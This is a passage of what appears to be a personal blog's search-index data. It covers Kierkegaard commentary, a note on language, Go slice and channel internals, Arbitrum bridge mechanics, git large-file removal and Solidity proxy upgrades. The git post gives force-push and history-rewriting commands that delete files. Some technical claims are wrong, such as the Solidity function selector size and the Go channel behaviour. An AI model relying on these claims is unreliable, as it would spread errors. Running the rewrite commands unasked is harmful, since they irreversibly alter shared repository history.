在小孩子要断奶的时候，母亲弄黑自己的乳房，当然，如果在孩子无法得到奶的时候，这乳房仍然看上去可口，这无疑也是遗憾的事情。这样一来，小孩子就会以为，乳房变了，但母亲，她仍是同一个人，她的目光就像往常一样地温柔亲切。那无须以更可怕的方式来为孩子断奶的人真是幸运啊！ 他的目光是狂野的，他的形象是恐怖。他抓住以撒的胸，把他扔在地上，并且说：“愚蠢的孩子，你以为我是你父亲？我是一个偶像崇拜者。你以为这是上帝的命令吗？不，这是我自己想要做的事情。 通过这里我们可以看到，这样的亚伯拉罕，他眼中的信仰是我是一个偶像崇拜者 这样的信仰，这样的信仰是一种子民式的信仰，之所以会用子民式这个词是因为我要应用一个很中二的台词： 王来承认，王来允许，王来背负整个世界 此时的亚伯来看就是被信仰所承认，被信仰所允许，最后的不，这是我自己想要做的事情 看是是在强调自我之存在，实际上是对最后残余的自我的否定，类比于，被卖了还帮忙数钱。其真实含义为，我甘愿臣服与我的信仰。 2 那是一个清晨，亚伯拉罕清早起来，他拥抱撒拉，他的老年的新娘，撒拉亲吻以撒，他消除掉了她的羞辱 [11] ，他是她的骄傲、她在所有族类中的希望。然后他们沉默地骑着驴上路了，亚伯拉罕的目光被钉在地上，直到第四天，这时，他抬眼远远地看向摩利亚山，然而，他的目光又转向地上。他沉默地把木柴放整齐，把以撒绑起。他沉默地拔出刀；这时他看见上帝所选的公羊。他献祭这公羊然后回家。……从这天起，亚伯拉罕变老了，他忘记不了，上帝向他要求了这个。以撒一如既往地蓬勃成长；但是亚伯拉罕的眼目昏浊了，他不再看见喜悦。 ****** 在小孩长大了要断奶的时候，这时，母亲处女般地隐藏起自己的胸脯，这样，孩子就不再有母亲。那没有以别的方式失去母亲的孩子真是幸运啊！ 亚伯拉罕的目光被钉在地上，直到第四天，这时，他抬眼远远地看向摩利亚山，然而，他的目光又转向地上。他沉默地把木柴放整齐，把以撒绑起。他沉默地拔出刀；这时他看见上帝所选的公羊。他献祭这公羊然后回家。……从这天起，亚伯拉罕变老了，他忘记不了，上帝向他要求了这个。以撒一如既往地蓬勃成长；但是亚伯拉罕的眼目昏浊了，他不再看见喜悦。 在这个故事里面，亚伯拉罕沉默了，他不再是之前那个狂热的信徒，他开始怀疑了，虽然他还是去献祭以撒去了，但是他并不认为献祭以撒是他自己的想法，甚至在最后，他在沉默中放弃了信仰。他忘记不了，上帝向他要求了这个 他并不依附于上帝，他知道上帝要求的他。 3 这是一个宁静的夜晚，这时亚伯拉罕一个人骑驴出去，他到了摩利亚山；他面孔朝地匍匐下来，他祈求上帝原谅他的罪，这罪就是：他曾想要牺牲以撒为祭品，父亲忘却了对儿子的义务。他更加频繁地一个人骑驴出行，但他得不到安宁。他无法领会这是一种罪，“他曾想要把他所拥有的最好的东西献祭给上帝”是一种罪，他所拥有的最好的东西，为了这东西他可以许多次以自己的生命去交换；如果这是罪的话，如果他不是如此地爱以撒的话，那么，他就无法明白，这罪是可以被原谅的；因为，又有什么罪会比这更可怕的？ ****** 在小孩子要断奶的时候，这时，母亲也不是没有悲哀的，她和孩子在越来越大的程度上相互分离开；这孩子，先曾是躺在她的心脏之下，然后又休憩在她的乳旁，将不再如此紧贴地靠近自己。于是他们一同在悲哀中度过这短暂的悲哀。那如此亲近地拥有过自己的孩子而无须悲哀更久的人真是幸运啊！ 这是很难理解的一章故事，他同样也是上一心境的延续，这一次他反抗了上帝，但他依然信仰着。我们首先需要把握住文中的“罪” – ”他曾想要牺牲以撒为祭品，父亲忘却了对儿子的义务“。 注意在信仰这个层面，不一定要做过，想也是do something（也是一个动词），需要区别于想过即是做过 这里的关键是父亲对儿子的义务 ,在信仰层面，这一罪是 想要否认这一义务，抽象一点是 “这罪是试图通过信仰否认义务&#x2F;伦理，这里的义务并不局限于父亲对儿子的义务” 另外一个难点是 – “这罪是可以被原谅的；因为，又有什么罪会比这更可怕的？” 我们已经知道这罪是借用信仰来否定义务&#x2F;伦理，那么这最为什么可以被原谅呢？或者说为什么他会说“因为，又有什么罪会比这更可怕的？”，难道这就值得被原谅吗？ 此处留白，我也不懂 4 那是一个清晨，在亚伯拉罕家里，旅行准备就绪。他与撒拉告别，忠实的仆人以利以谢 [13] 陪送他上路，直到他重返。他们和谐默契地一起骑着驴旅行，亚伯拉罕和以撒，直到他们到达摩利亚山。但是亚伯拉罕为献祭准备好了一切，平静而温和，但是在他转过身去拔出刀的时候，这时，以撒看见了亚伯拉罕的左手绝望地紧紧握住，一阵颤动闪遍他的整个身体，——但是亚伯拉罕拔出了刀。 在他们重新回到家的时候，撒拉急忙地奔向他们，但是，以撒失去了信仰。世上不曾有任何对此的讨论，以撒从不曾对任何人说过他所见到的东西，而亚伯拉罕也丝毫想不到有人看见了这个。 ****** 在小孩子要断奶的时候，这时，母亲手头有着更强劲的食物，这样，这孩子就不会死去。那手头有着更强劲的食物的人真是幸运啊！ 于是，以这样的方式，以及以许多类似的方式，我们所谈论的这个人想着这一事件。每一次在他漫步去摩利亚山之后回家的时候，这时，他因疲劳而瘫坐下来，他握合起自己的手并且说：“亚伯拉罕伟大无与伦比，又有谁能够理解他呢？” 由于上一章看的不是很明白，这一章实际上依然没法完全看懂。 关于亚伯拉罕只有一个地方需要注意– 以撒看见了亚伯拉罕的左手绝望地紧紧握住，一阵颤动闪遍他的整个身体，——但是亚伯拉罕拔出了刀。 这里的“一阵颤动闪遍他的整个身体“ 我们接着上一章分析，不难看出这里是从伦理到信仰的转换，如果上一章亚伯拉罕重视的是伦理，那这里就是转换为信仰。 我们可以通过下面关于小孩断奶的描述来窥探一二，这里的奶是指代义务&#x2F;伦理，而更强劲的食物则是指代信仰。 另外还有一点要提的是以撒看见了亚伯拉罕的左手绝望地紧紧握住 这里的绝望值得是在义务与信仰之间的临界，由于信仰在义务中绝望，突破这一绝望也就是全然的拥抱信仰，也就是克尔恺郭尔后面会提到的信仰之跃。 我之所以会做 义务到信仰之转换 这一猜测，是因为，这一章里面的亚伯拉罕已经全然的信赖了，他在献祭的过程中完成了信仰之跃，这一信仰之跃并不等同于第一章里面的子民式的信仰，是一种，“我想做的即是上帝想让我做的”，而不是“上帝让我想这么做”","categories":[{"name":"图书","slug":"图书","permalink":"https://bighu630.github.io/categories/%E5%9B%BE%E4%B9%A6/"},{"name":"恐惧与颤栗","slug":"图书/恐惧与颤栗","permalink":"https://bighu630.github.io/categories/%E5%9B%BE%E4%B9%A6/%E6%81%90%E6%83%A7%E4%B8%8E%E9%A2%A4%E6%A0%97/"}],"tags":[{"name":"克尔恺郭尔","slug":"克尔恺郭尔","permalink":"https://bighu630.github.io/tags/%E5%85%8B%E5%B0%94%E6%81%BA%E9%83%AD%E5%B0%94/"}],"author":"ivhu"},{"title":"语言是什么","slug":"语言是什么","date":"2024-12-25T11:25:42.000Z","updated":"2026-02-27T03:14:28.901Z","comments":true,"path":"2024/12/25/语言是什么/","permalink":"https://bighu630.github.io/2024/12/25/%E8%AF%AD%E8%A8%80%E6%98%AF%E4%BB%80%E4%B9%88/","excerpt":"","text":"语言语言的基本组成： 名词 动词 形容词 语言的填充： 冠词 介词 … 基本语言有名词，动词，形容词组成。普遍ai可以识别出这三者，从而完成简单交流 在语言的填充上，介词等，可能会对语义产生较大的影响。 语言的根基语言的基本元素是无意义的，例如，“悲伤”，我们无法从“悲伤”这个词中拿到任何有用的信息。 语言必须是在语境中的。 关于语言在语境中，这里有一点需要谈到。语言在语境中导致了这样一个现象 - 语境的过度复杂 - ，以至于在层层叠加的语境中，我们找不到语言的原有含义。由此，演化出了当代的结构主义 – 找到语言的原始语境。将语境解构为他原始的模样。早期解构主义我是比较认可的，他破除了语境的复杂性。而随之结构主义的逐步推进，语言的无意义信暴露出来。语言无法自语境之外产生意义。语境像是一团迷雾透过迷雾去看我们才会去 understand 一些事情，而当迷雾散去，我们却好像失明了。而当迷雾太厚，我们则被动失明。 语境语境是语言运行的环境，就像程序运行的环境一样，Linux 上的软件可以在 Linux 上运行，它可以有一个图形化界面，我可以像现在这样在里面写文章，或者做别的什么。而当我们把这个程序拿到别的环境，或者是直接打印出来，那他就什么也做不了，语言必须运行在特定的环境中。 语境的划分 强语境 弱语境 强语境指的是在语境下存在大量公知的信息，比如家庭环境，在家庭环境中父母亲对孩子的性格，以及语言中的省略信息都有较多的了解，在强语境环境中，只进行少量的信息传递，并且新信息一般不会影响语境信息。强语境中一般误解会出现的比较少（当然，前提是对语境足够了解，如果对语境理解错误，那么对语义的理解将会错的更远），更多的矛盾冲突，强语境会迅速确认一个信息，而没有更多的周旋的余地。在强语境环境下，人会受语境的影响，首先，人需要学习语境，而在这个过程中，改变的一般是人，而不是语境。 弱语境则刚好与强语境相反，弱语境下一般公共知识较少，例如社会环境。在社会环境中，人与人之间的相互理解较少。对于一个叙事描述，除非叙事者从头到尾把事情讲一遍，否者接受者很难理解都叙事者的叙事。在弱语境中，由于语言的开放性，语义会被接受者重新构建，而导致信息的失真。弱语境中强调个体性，忽视集体中存在的潜在语义。弱语境倾向于将叙事回归到个人。弱语境因为相互之间的不理解而避免了很多冲突。而在弱语境下，相互之间是不需要理解的，他们不强调构建强语境，所以也没必要理解。","categories":[{"name":"知识","slug":"知识","permalink":"https://bighu630.github.io/categories/%E7%9F%A5%E8%AF%86/"},{"name":"传播学","slug":"知识/传播学","permalink":"https://bighu630.github.io/categories/%E7%9F%A5%E8%AF%86/%E4%BC%A0%E6%92%AD%E5%AD%A6/"}],"tags":[{"name":"语言","slug":"语言","permalink":"https://bighu630.github.io/tags/%E8%AF%AD%E8%A8%80/"}],"author":"ivhu"},{"title":"go 八股文复习-2","slug":"go-八股文复习-2","date":"2024-12-16T09:16:37.000Z","updated":"2026-02-27T03:14:28.899Z","comments":true,"path":"2024/12/16/go-八股文复习-2/","permalink":"https://bighu630.github.io/2024/12/16/go-%E5%85%AB%E8%82%A1%E6%96%87%E5%A4%8D%E4%B9%A0-2/","excerpt":"","text":"常见数据结构&amp;实现原理 – sliceslice（切片）是go语言中的一中类似与数据的数据结构，和数组一样，它使用下标访问，但是slice的长度是可变的（可增长的），而数组的长度是不可变，在初始时定义好的。所以slice是分配在堆上面，而数组通常是分配在栈上面。 Slice的数据结构type slice struct { array unsafe.Pointer // 底层数组 len int // 长度,是指已经使用的长度 cap int // 底层数组的长度 } 其中 len 表示这个slice的长度， cap 表示这个slice最多容纳的大学，当数据量超过这个值之后，需要重新分配一个更大的slice 通过slice := make([]int, 5, 10) 我们可以创建长为5,容量为10的slice 默认初始值为类型对应的初始值，也就是 0-4会被赋值为0 注意，虽然slice的总容量是10 ，但是当我们访问下表为5的数据是，会panic 访问越界 我们可以在一个数组的基础上创建一个slice eg： array := [10]int slice := array[1:4] slice的array指针会直接指向原array的下标1len 设置为3(那么我们访问下标3时会报错，即使底层数组的这个位置是有元素的)cap 是底层数组的长度,由于slice是从底层数组的下标1开始的，所以这里的cap是 10-1 slice扩容那我们上面生成的cap为10的slice为例，当我们使用append添加第11个元素时，因为超过slice的cap限制，go会重新分配一段更大内存给这个slice,然后把原先slice的值复制过去 所以如果我们用 append(slice,3) 直接添加值时，如果slice没有发生扩容，我们不需要接受slice,因为和原先的一样,但如果发生扩容，我们将拿不到扩容之后的数组 所以进行append操作时我们要接受返回值 slice = append(slice,3) 这样即使发生扩容，我们的slice也是扩容之后的 扩容规则目前常见的规则说法是： 如果原Slice容量小于1024，则新Slice容量将扩大为原来的2倍； 如果原Slice容量大于等于1024，则新Slice容量将扩大为原来的1.25倍； slice注意事项slice是共享内存的,也就是把一个slice赋值给其他多个slice,他们在底层都是共用一个数组的，在编码时需要注意读写冲突，以及避免数据污染 eg: slice &#x3D; make([]int, 5, 10)sa &#x3D; slice[1:3]sb &#x3D; slice[2:] 当sa中的sa[1]变动时，sb[0]也会跟着变 sa[1] 和 sb[0] 在底层数组上是同一个位置","categories":[{"name":"计算机","slug":"计算机","permalink":"https://bighu630.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"},{"name":"笔记","slug":"计算机/笔记","permalink":"https://bighu630.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"go","slug":"go","permalink":"https://bighu630.github.io/tags/go/"},{"name":"八股文","slug":"八股文","permalink":"https://bighu630.github.io/tags/%E5%85%AB%E8%82%A1%E6%96%87/"}],"author":"ivhu"},{"title":"arbitrum 资产桥合约","slug":"arbitrum-资产桥合约","date":"2024-12-15T02:51:52.000Z","updated":"2026-02-27T03:14:28.899Z","comments":true,"path":"2024/12/15/arbitrum-资产桥合约/","permalink":"https://bighu630.github.io/2024/12/15/arbitrum-%E8%B5%84%E4%BA%A7%E6%A1%A5%E5%90%88%E7%BA%A6/","excerpt":"","text":"资产桥的作用Rollup 的主要流程中，实际上不包含资产桥，也就是说即使没有资产桥，L2依然能正常运行但是此时L1与L2在数据上是完全独立的两条链，L1不理解L2上的数据（L1只保存L2压缩后的数据，不理解数据）,L2上也不知道L1上发生了什么（只能拿到区块高度等一些基本信息）。完全可以把L2做是另外一条链。 在这种情况下如果需要做资产转移，就和普通的一层链之间的资产转移没什么区别. 而有了自己实现的资产桥就不一样，因为实际上L2的数据都是通过L1上的inbox(sequencer inbox)合约保存的，所以当我们在inbox合约中解析数据，L1上就可以看到L2上的部分数据虽然这会增加L1上的手续费，但是这样可以降低跨链带来的安全性问题（跨链过程本质上是在L1上的inbox合约中，其他逻辑则完全嵌套在L2的主用逻辑中，也就是跨链的安全性&#x3D;整个L2的安全性&#x3D;aribtrum的any-trust模型） arbitrum 的快箱&amp;慢箱在介绍资产桥之前，我们先来区分一下arbitrum的快箱和慢箱。 快箱 (Sequencer Inbox)快箱是L2交易的入口（写入sequencer的交易最终会在L2上被处理，sequencer的处理实际上还没进入L2）在Sequencer inbox中交易会迅速被validator打包(validator的打包逻辑就是在在inbox中拿数据,来打包) 慢箱（inbox)慢箱中的交易是L1往L2上发送的交易,通过慢箱，我们可以在L1上改变L2的世界状态. 慢箱的实际价值有两个 L1向L2发送数据是，L2不需要验证L1的数据，L1的数据只能通过inbox进入L2,对数据的校验都发生在L1的inbox合约中 抗审查，因为L2的所有交易都是由sequencer打包的，而sequencer是一个中心化的节点，sequencer可以对L2上的交易进行恶意的审查从而拒绝部分交易（sequencer 不能修改交易内容，因为他没有指定账户的私钥）.此时可以通过L1上的inbox合约强行把交易写入L2（实际上最终也是写入sequencer inbox）,L2的区块是validator在Rbolck中确定的（sequencer不同意也无所谓）,当交易通过慢箱写入L2后，sequencer只能接受这个交易（否则会因为与L2的状态不一致导致失去部分功能） 资产桥的运作知道慢箱的处理逻辑之后，我们可以来看看资产桥是怎么运作的. 资产桥分为两种处理逻辑，L1到L2（充值），L2到L1（提现），当然arbitrum的资产桥不只是能做资产转移的操作，实际上也可以完成calldata的跨链操作（把calldata传递到L2指定的合约） 充值过程在讨论充值问题之前，我们需要考虑下面几个 ETH怎么铸造？ ERC20怎么处理？ L2上没有对应的ERC20合约怎么办？自动部署，还是交易直接失败? 怎么控制L2铸造的权限，L2上的代币最终是可以提现在L1上的，如果随便铸造，跟L1对不上账怎么办？ 铸造的时候L2手续费暴涨，铸造失败怎么办？ arbitrum 的资产桥是典型的锁定-铸造 销毁-解锁模型,L1上锁定的代币，L2上怎么铸造. gateway要回答这些问题，我们先来看一下arbitrum的资产桥模型 gateway gateway实现了L1 &lt;–&gt; L2资产合约的映射（ETH也使用合约的方式来映射） arbitrum提供来了一些标准的ERC20 template,正常情况下，如果L1上的资产合约也是标准的ERC20,那么arbitrum会自动在L2上部署一个相同的ERC20合约（可能详细功能不同，但是能实现ERC20的逻辑）,而这个映射出来的ERC20 通过gateway做权限验证，也就是只有gateway合约能在这个合约中铸造和销毁，这样保证了L1和L2上的账能对的上. 插一个小知识，arbitrum链上的交易手续费是使用ETH来支付的，但arbitrum本身不产生ETH(这点我不是很确定),所以在使用arbitrum之前，需要从以太坊上冲一些ETH到arbitrum上，这个充值交易的手续费在L1上支付,注意这里不是代付，是在交易到达L2后直接在L1中的msg.value中扣除。涉及到L1 &lt;–&gt; L2交易一个非常麻烦的问题 – 手续费处理。这里就不详细展开 retryable 可重试票据可重试票据主要是用来解决L2上铸造失败的情况,L1上充值交易发送到L2上之后，可能因为L2上手续费超过 用户愿意支付的手续费阈值（在L1上发送充值交易时指定的）时可能导致交易的失败。这时候交易已经记录到L2上只是执行失败（calldata还在）,用户可以在L2上手动重试,手动重试不能改变calldata,但是手续费是在重试交易中一起支付的。L1 -&gt; L2的可重试票证只会保存7天，7天之后，资产将会永久的锁定在L1上（可以续费延期）. 正常情况L1上的充值操作不需要用户去L2上触发铸造，L2会自动完成铸造.L2 -&gt; L1就不行，必须去L1上手动提现，当然相对而言L2 -&gt; L1的票据是永久有效的,用户不需要急着提现 ok,我们已经知道了资产桥的架构,现在来看一下充值的详细过程 充值过程，用户调用L1 inbox合约中的createRetryableTicket方法创建可重试票据,指定L2上的接受者地址，token地址，手续费等， inbox会将L1的资产锁定的L1上对应资产的gateway合约中，并将L2上的铸造请求的ticket写入sequencer inbox合约中 L2 订阅到sequencer inbox 中的铸造请求后会找到对应的gateway合约（这部分工作是gateway router做的）,铸造代币 如果L2自动铸造失败,这是用户可以在L2 上手动重试，或者在L1上完成手动重试（避免排序器审查） 提现流程在理解充值流程后，提现就很容易理解了 提现的过程实质上是操纵gateway合约完成代币销毁，并生成票据，将票据写回到L1上 这里简单解释一下写回操作: 写回操作是通过arbitrum的outbox实现的，由validator来调用L1上的outbox合约将数据写回到L1,但是写回操作并不直接执行这些数据，只是记录数据，最后的执行需要用户手动去触发，这也是为什么提现操作不会自动在L1上进行(目前猜测是因为L2-&gt;L1不好控制手续费，所以没有在这里做自动执行，并且，自动执行相当于是L2自动修改L1的状态，实际上是比较不可控的) 当充值操作写回到L1的outbox之后，用户就可以在L1上解锁资产 Q: 我冲了10WETH 可以提现20WETH吗？这是可以的，如果你在L2上赚钱了(多赚了10WETH)，只要L2提供的票据说你销毁了20WETH, 那么在L1上就会给你解锁20WETH, 桥只要保证总资产的帐对的上就可以.","categories":[{"name":"区块链","slug":"区块链","permalink":"https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"},{"name":"二层","slug":"区块链/二层","permalink":"https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/%E4%BA%8C%E5%B1%82/"}],"tags":[{"name":"arbitrum","slug":"arbitrum","permalink":"https://bighu630.github.io/tags/arbitrum/"},{"name":"资产桥","slug":"资产桥","permalink":"https://bighu630.github.io/tags/%E8%B5%84%E4%BA%A7%E6%A1%A5/"}],"author":"ivhu"},{"title":"go 八股文复习-1","slug":"go-八股文复习-1","date":"2024-12-14T08:31:00.000Z","updated":"2026-02-27T03:14:28.899Z","comments":true,"path":"2024/12/14/go-八股文复习-1/","permalink":"https://bighu630.github.io/2024/12/14/go-%E5%85%AB%E8%82%A1%E6%96%87%E5%A4%8D%E4%B9%A0-1/","excerpt":"","text":"常见数据结构&amp;实现原理 – chan chan是用来提供go协程间通信通道的工具，也是go高并发优势的重要组成部分，通过chan我们可以非常简单的实现协程之间的通信（只需要用 &lt;- 写入 用-&gt; 读取） chan 的数据结构 type hchan struct { qcount uint // 当前队列中剩余元素个数 dataqsiz uint // 环形队列长度，即可以存放的元素个数, 初始化时指定 buf unsafe.Pointer // 环形队列指针 elemsize uint16 // 每个元素的大小,元素根据大小线性排布，后面根据offset取值 // 关闭状态的chan是可读的，如果chan关闭 读取时没有内容， // 那么会直接返回nil,false（代表读取失败，&lt;- 读到的是一个空指针），而不会阻塞， // 如果没有关闭，没有数据可以读取时会阻塞 closed uint32 // 标识关闭状态 elemtype *_type // 元素类型 sendx uint // 队列下标，指示元素写入时存放到队列中的位置 recvx uint // 队列下标，指示元素从队列的该位置读出 // 如果一个协程在读chan,chan中没有数据，那么协程就会挂在这里, 等到有数据读时再唤醒 // FIFO队列，先进先出 recvq waitq // 等待读消息的goroutine队列 sendq waitq // 等待写消息的goroutine队列 lock mutex // 互斥锁，chan不允许并发读写,所以chan是并发安全的 } chan 中使用环形队列实现缓冲区(实际上就是在遍历最后一个后将索引指向第一个,实际上还是线性的) chan的读写 向chan写入数据 如果recvq中有goroutine(G)等待，则将数据写入G并且唤醒G 如果recvq中没有等待的G,则尝试写入缓冲区，如果缓冲区也没有，则阻塞并挂在sendq上 在chan中读取数据 查看sendq不为空（说明有G阻塞在写入） 此时如果有缓冲区，那么应该先读缓冲区的，并且在sendq中取出一个G来写入数据（因为我们拿走了一个，所以现在缓冲区未满 此时如果没有缓冲区，那么我们直接在sendq中取一个G,并读取他的数据 如果sendq为空 尝试去缓冲区读数据 阻塞，并挂在recvq上 单向chan 实际上不存在单向chan,是在函数内做的约束,可以直接把一个chan当作只读&#x2F;只写的chan传递 关闭chan 关闭chan时 唤醒所有的recvq,向所有的recvq中写入nil 唤醒所有的sendq,使他们panic recvq和sendq一般不会同时有G 除此之外，panic出现的常见场景还有： 关闭值为nil的channel关闭已经被关闭的channel向已经关闭的channel写数据 selectselect 可以同时监控多个chan,并不会阻塞，select支持向chan中写或者读取chan中的数据，如果碰巧写不进去(缓冲区满了)，读不到(没有数据),select不会阻塞，而是直接跳过（后续select章节将会详细描述如何选择） select 对case条目的处理是随即的，所以并不是在前面的case就会先触发。 range使用range可以持续的读取chan中的数据，如果chan中没有数据，则阻塞 注意：如果向此channel写数据的G退出时，系统检测到这种情况后会panic，否则range将会永久阻塞。","categories":[{"name":"计算机","slug":"计算机","permalink":"https://bighu630.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"},{"name":"笔记","slug":"计算机/笔记","permalink":"https://bighu630.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"go","slug":"go","permalink":"https://bighu630.github.io/tags/go/"},{"name":"八股文","slug":"八股文","permalink":"https://bighu630.github.io/tags/%E5%85%AB%E8%82%A1%E6%96%87/"}],"author":"ivhu"},{"title":"克尔凯郭尔_那审美的","slug":"克尔凯郭尔-那审美的","date":"2024-12-09T01:59:33.000Z","updated":"2026-02-27T03:14:28.900Z","comments":true,"path":"2024/12/09/克尔凯郭尔-那审美的/","permalink":"https://bighu630.github.io/2024/12/09/%E5%85%8B%E5%B0%94%E5%87%AF%E9%83%AD%E5%B0%94-%E9%82%A3%E5%AE%A1%E7%BE%8E%E7%9A%84/","excerpt":"","text":"碰巧失眠，所以又来看了一下克尔凯郭尔。 今天主要提到的是末明子的一小段关于人生三阶段的 审美阶段的的解释（他的解释其实在其他地方已经听过）。那审美的是指 那 在自身之中的，不连续的 无方向且无忧虑的享乐主义视角。以及我碰巧点进他的直播间，应该是在聊他的 主义主义 之类的，然后马上被封。 其实就我的感觉而言，末明子的组织也是处在 那审美的 阶段中。 我可能需要稍微花点时间来解释什么是那审美的（这也是这篇小计的主要内容）。 首先我们需要借用一个词– 独立。通过把玩（扭曲）这个词的解释来窥探那个在自身之中的自己。 那么在自身之中的自我是独立的吗？答案显然不是。在自身之中的自我是被架起来的自我。是一种无意识的自我，指的是我被（那个我）所架起来的我，我无法指挥那个我做什么，而只是在（那个我）之中体验着（那个我）给我带来的感官刺激。 这里我们需要仔细剖析（那个我）究竟是什么。这也是为什么，那审美的我是不独立的我。同时也解释什么是那审美的。（那个我）是并不以我而成为的我，（那个我）是环境对我的映射，即环境构造出（那个我），（注：环境在这里可以理解为无意义切连续的），环境的连续性使得我在审美上处于一种浅层次的连续中，即我会认为我是一个感官动物，这也是处在审美状态中的人的体验。而我们的不连续性体现在，当我们试图在那个无意义状态的自我中寻找意义的时候，我们就会发现自身的不连续性，因为在自我之中的人是被环境裹挟的人，自我寻求意义，而那个我只能给予感官刺激。这时候，意义成为一种巧合，当感官刺激符合意义时，意义显现出来，当感官刺激异于意义时，意义消失。当然，这里的寻求意义，实际上就是在窥视那个在自我之中而不是自我的动作。而这种在自我之中的我则恰恰是不独立的。（抱歉，突然发现上面说的是在自我之中的切不愿是自我的状态）。 全然在自我之中的状态是一种在自我之中且没有意识到在自我之中的状态。这是这样一种状态–寻求环境认可的状态。因为自我在环境构建的那个自我之中，自我并不认为有自我，而成为环境的附属，服从与环境：典型代表为纯粹的享乐主义，即放弃自我而全然拥抱环境的感官刺激，努力让自己变成享受的姿态。 那么独立的意义就是，那在自我之中且是自我的状态。 补充，可能那审美的阶段还缺乏叔本华的钟摆理论（我不是很像讨论欲望相关的东西，因为欲望在那审美的阶段中是无方向，且无意义的），在审美阶段中的人的其中之一的表现是他不理解自己的欲望，欲望得到满足时他无聊，欲望的不到满足时他痛苦，他的幸福只在那一瞬间","categories":[{"name":"哲学","slug":"哲学","permalink":"https://bighu630.github.io/categories/%E5%93%B2%E5%AD%A6/"},{"name":"克尔凯郭尔","slug":"哲学/克尔凯郭尔","permalink":"https://bighu630.github.io/categories/%E5%93%B2%E5%AD%A6/%E5%85%8B%E5%B0%94%E5%87%AF%E9%83%AD%E5%B0%94/"}],"tags":[{"name":"沉思录","slug":"沉思录","permalink":"https://bighu630.github.io/tags/%E6%B2%89%E6%80%9D%E5%BD%95/"},{"name":"审美","slug":"审美","permalink":"https://bighu630.github.io/tags/%E5%AE%A1%E7%BE%8E/"}],"author":"ivhu"},{"title":"git删除大文件","slug":"git删除大文件","date":"2024-12-04T03:31:21.000Z","updated":"2026-02-27T03:14:28.899Z","comments":true,"path":"2024/12/04/git删除大文件/","permalink":"https://bighu630.github.io/2024/12/04/git%E5%88%A0%E9%99%A4%E5%A4%A7%E6%96%87%E4%BB%B6/","excerpt":"","text":"背景为什么git提交中会有大文件？ 一般而言我们只会把代码放到git仓库，比较大 的可执行文件用其他方式保存，但是有时候因为疏忽把编译好的文件也给commit了，这时候这些文件就会像狗皮膏药一样粘在git上，pull&#x2F;clone的时候反作用给你。 使用 git filter-repo 删除历史中的大文件删除指定的大文件假设你知道要删除的文件路径，例如 largefile.zip，可以运行以下命令： git filter-repo --path largefile.zip --invert-paths 这将从所有历史记录中删除 largefile.zip 文件。 删除超过特定大小的文件如果你不确定具体文件，但知道文件过大，可以删除超过一定大小的所有文件。例如，删除所有超过 10MB 的文件： git filter-repo --strip-blobs-bigger-than 10M 强制推送到远程仓库修改历史后，你需要强制推送到远程仓库以覆盖旧的记录： git push origin --force --all git push origin --force --tags 使用 git filter-branch（较旧的方法）删除指定文件的历史假设你想删除文件 largefile.zip： git filter-branch --tree-filter &#39;rm -f largefile.zip&#39; --prune-empty -- --all 删除大于特定大小的文件如果你想删除大于某个大小的所有文件（例如 10MB），可以结合 find 命令： git filter-branch --tree-filter &#39;find . -type f -size +10M -exec rm -f {} \\;&#39; --prune-empty -- --all 同样，需要推送到远端 瘦身远程仓库：在修改完历史后，你可能需要在远程仓库上运行垃圾回收命令： git gc --prune=now --aggressive 通过这些步骤，你可以安全地删除 Git 历史中的大文件，同时保持代码库的可用性。","categories":[{"name":"计算机","slug":"计算机","permalink":"https://bighu630.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}],"tags":[{"name":"git","slug":"git","permalink":"https://bighu630.github.io/tags/git/"}],"author":"ivhu"},{"title":"solidity合约升级2","slug":"solidity合约升级2","date":"2024-11-28T03:43:38.000Z","updated":"2026-02-27T03:14:28.899Z","comments":true,"path":"2024/11/28/solidity合约升级2/","permalink":"https://bighu630.github.io/2024/11/28/solidity%E5%90%88%E7%BA%A6%E5%8D%87%E7%BA%A72/","excerpt":"","text":"上回我们聊到了合约升级的原理（所依赖的solidity特性），一个是代理调用，他运行我们加载其他合约的逻辑来修改当前合约的数据，以及fallback函数，他可以出来未知的函数调用，让我们能够把请求转发到逻辑合约里面去，而逻辑合约的升级就是直接更换代理合约中的逻辑合约地址。这一回，将讲述常见的几种标准化的合约升级方案。 合约升级方案通用合约升级通用合约升级实际上没有提出什么有建设性的技术，只是单纯的使用上面的特性完成合约升级，并且将合约升级所面临的问题揭露出来 目前基本上没有项目继续使用这种合约升级方案。 他的流程就是简单的通过代理合约调用逻辑合约，每次函数调用，实际上执行的是逻辑合约的代码，修改的是代理合约的存储空间。当需要升级时，需要新部署逻辑合约，然后将代理合约中的（逻辑合约地址）修改为新的逻辑合约，在升级后的调用中代理合约会加载新的逻辑合约代码（代理合约只是根据合约地址加载合约的代码，他所以并不会引起不一致） 这样的合约升级会带来两个问题（主要是这两个） 存储冲突虽然数据是存储在代理合约中的，但是由于逻辑合约中定义了对数据的操作，所以逻辑合约中也需要有对应的数据。比如有这样一种情况 代理合约中的数据是 contract Proxy { uint a; uint b; uint c; } 逻辑合约中的定义是 contract Logic { uint b; // 逻辑合约只操作了数据B,所以没定义a,c function add() { b = b+1; } } 这时，如果代理调用在逻辑合约中对b 进行了+1操作。实际上发生的是，用户call Proxy合约，Proxy合约加载 Logic合约中的add代码add代码实际上的操作是拿出第一个位置的数据，+1 ，写回去. 注意，这里是拿出第一个位置的数据，因为solidity编译后是没有变量名的，而是使用变量的位置来记录变量的。 所以当这段代码在Proxy中执行的时候，实际上是修改a位置的值。 这个问题怎么解决呢？ 最简单的是，要求逻辑合约的变量顺序和代理合约一致，无论是否使用数据.但这么做似乎是不太美观的，我们似乎要在合约里定义一堆意义不明的变量.工业上使用的方法是通过继承，我们把所有的变量都卸载一个（或者多个）sol文件中，在逻辑合约和代理合约中以相同的顺序继承这些变量，这样就可以万无一失的保证不会出现数据冲突。 函数选择器冲突 之前我们提到过函数选择器冲突：代理合约不全是使用代理请求，他至少有一个update方法来更新逻辑合约的地址，而EVM中判断call指定的方法是使用一个8byte的函数选择器（函数名是函数签名的hash 的前八位），而8位的函数选择器导致我们很难保证两个不同的函数不会产生相同的函数签名。 